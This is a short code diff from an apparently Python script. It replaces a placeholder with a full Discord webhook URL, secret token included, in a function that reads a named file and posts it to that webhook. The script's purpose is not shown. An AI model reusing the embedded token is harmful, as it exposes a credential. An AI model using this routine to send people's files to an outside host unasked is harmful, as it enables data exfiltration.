@@ -31,7 +31,7 @@ def parse_command(command):
 
 # Send file to Discord webhook
 def send_file_to_webhook(filename):
-    url = "YOUR_DISCORD_WEBHOOK_URL"
+    url = "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"
     with open(filename, "rb") as f:
         files = {"file": f}
         response = requests.post(url, files=files)
